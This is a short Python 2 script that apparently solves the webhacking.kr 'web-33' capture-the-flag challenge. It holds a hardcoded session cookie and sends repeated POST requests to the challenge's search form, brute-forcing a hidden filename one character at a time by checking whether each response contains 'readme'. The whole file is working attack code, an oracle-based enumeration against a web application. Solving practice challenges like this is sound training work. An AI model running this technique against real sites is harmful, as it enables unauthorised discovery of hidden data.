import requests
import string

cookies = {"PHPSESSID": "8374cd9b3e539ffbe463eafced613264"}
url = "http://webhacking.kr/challenge/web/web-33/index.php"

av = ""
"""for i in string.printable :
    data = {"search":i}
    r = requests.post(url, cookies=cookies, data=data)
    if "readme" in r.text :
        av += i
        print av"""
av = "hkp0._"

mr = ""
while True :
    count = 0
    for c in av :
        check = mr + c
        data = {"search":check}
        r = requests.post(url, cookies=cookies,data=data)
        if "readme" in r.text :
            mr = check
            print mr
            break
        count += 1
    if count == len(av) :
        break

while True :
    count = 0
    for c in av :
        check = c + mr
        data = {"search":check}
        r = requests.post(url, cookies=cookies, data=data)
        if "readme" in r.text:
            mr = check
            print mr
            break
        count += 1
    if count == len(av) :
        break